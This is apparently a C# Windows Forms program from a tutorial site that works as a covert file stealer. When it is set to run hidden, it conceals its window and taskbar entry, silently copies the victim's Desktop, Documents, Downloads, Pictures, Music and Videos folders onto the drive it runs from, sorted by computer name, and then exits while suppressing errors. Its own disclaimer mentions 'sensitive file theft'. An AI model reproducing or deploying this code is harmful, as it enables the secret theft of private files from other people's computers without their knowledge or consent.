using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PcFilesToFlashDrive
{
    public partial class Form1 : Form
    {

        string abouts = "Disclaimer: \nPlease don't misuse this application. \n" +
                        "The author is not liable for any sensitive file theft! . Use this app responsibly. \n\n" +
                        "{IT / CS} Tutorial\n" +
                        "Join our community! With real time chat, free ebook downloads, secret files and more! Register @\n" +
                        "http://itcstutorial.xyz/register.php\n\n" +

                        "Support our new Page:" +
                        "https://www.facebook.com/itcstuts/\n\n" +

                        "You can find more demos with source codes here\n" +
                        "http://itcstutorial.xyz/showvideos.php?cat=11\n\n" +

                        "Visit the site for more Funny IT / CS Memes!\n" +
                        "http://itcstutorial.xyz/memes.php\n\n" +

                        "Feel free to read our Blog Post!\n" +
                        "http://itcstutorial.xyz/blogposts.php\n\n" +

                        "Visit the site for more Video Tutorials!\n" +
                        "http://itcstutorial.xyz/\n\n";



        public Form1()
        {
            InitializeComponent();
            txtabout.Text = abouts;
            chkdesktop.Checked = Properties.Settings.Default.DesktopCopy;
            chkdocuments.Checked = Properties.Settings.Default.DocumentsCopy;
            chkvideos.Checked = Properties.Settings.Default.VideosCopy;
            chkmusic.Checked = Properties.Settings.Default.MusicCopy;
            chkdownloads.Checked = Properties.Settings.Default.DownloadsCopy;
            chkpictures.Checked = Properties.Settings.Default.PicturesCopy;
            showonstart.Checked = Properties.Settings.Default.ShowOnStartup;

            txtlimit.Text = Properties.Settings.Default.LimitFileSize + "";


        }

        private void chkdesktop_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DesktopCopy = chkdesktop.Checked;
            Properties.Settings.Default.Save();
        }

        private void chkdocuments_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DocumentsCopy = chkdocuments.Checked;
            Properties.Settings.Default.Save();
        }

        private void chkdownloads_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DownloadsCopy = chkdownloads.Checked;
            Properties.Settings.Default.Save();
        }

        private void chkmusic_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.MusicCopy = chkmusic.Checked;
            Properties.Settings.Default.Save();
        }

        private void chkpictures_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.PicturesCopy = chkpictures.Checked;
            Properties.Settings.Default.Save();
        }

        private void chkvideos_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.VideosCopy = chkvideos.Checked;
            Properties.Settings.Default.Save();
        }

        private void txtabout_LinkClicked(object sender, LinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(e.LinkText);
        }

        private void showonstart_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.ShowOnStartup = showonstart.Checked;
            Properties.Settings.Default.Save();
        }

        private void Form1_Load(object sender, EventArgs e)
        {


            bool showOnStart = Properties.Settings.Default.ShowOnStartup;
            if (showOnStart == false)
            {
                this.Visible = false;
                this.ShowInTaskbar = false;
                this.WindowState = FormWindowState.Minimized;

                //GetAllLinks
                string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string MyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string MyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string MyVideos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string pathUser = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string Downloads = Path.Combine(pathUser, "Downloads");


                string ComputerName = Environment.MachineName;

                bool desktop = Properties.Settings.Default.DesktopCopy;
                bool documents = Properties.Settings.Default.DocumentsCopy;
                bool videos = Properties.Settings.Default.VideosCopy;
                bool musics = Properties.Settings.Default.MusicCopy;
                bool downloads = Properties.Settings.Default.DownloadsCopy;
                bool pictures = Properties.Settings.Default.PicturesCopy;



                if(desktop)
                CopyAll(new DirectoryInfo(Desktop), new DirectoryInfo("./Computers/"+ComputerName+"/Desktop/"));

                if(documents)
                CopyAll(new DirectoryInfo(MyDocuments), new DirectoryInfo("./Computers/" + ComputerName + "/Documents/"));

                if(videos)
                CopyAll(new DirectoryInfo(MyVideos), new DirectoryInfo("./Computers/" + ComputerName + "/Videos/"));

                if(musics)
                CopyAll(new DirectoryInfo(MyMusic), new DirectoryInfo("./Computers/" + ComputerName + "/Musics/"));

                if(downloads)
                CopyAll(new DirectoryInfo(Downloads), new DirectoryInfo("./Computers/" + ComputerName + "/Downloads/"));

                if(pictures)
                CopyAll(new DirectoryInfo(MyPictures), new DirectoryInfo("./Computers/" + ComputerName + "/Pictures/"));

                Application.Exit();

            }

        }


        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            try
            {
                Directory.CreateDirectory(target.FullName);
                foreach (FileInfo fi in source.GetFiles())
                {
                    if(fi.Length <= Properties.Settings.Default.LimitFileSize)
                    fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
                }
                foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
                {
                    DirectoryInfo nextTargetSubDir =
                        target.CreateSubdirectory(diSourceSubDir.Name);
                    CopyAll(diSourceSubDir, nextTargetSubDir);
                }
            }
            catch (Exception ex) { }
        }

        private void btnset_Click(object sender, EventArgs e)
        {
            try
            {
                Properties.Settings.Default.LimitFileSize = Convert.ToInt64(txtlimit.Text);
                Properties.Settings.Default.Save();
                txtlimit.Text = Properties.Settings.Default.LimitFileSize + "";
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
    }
}
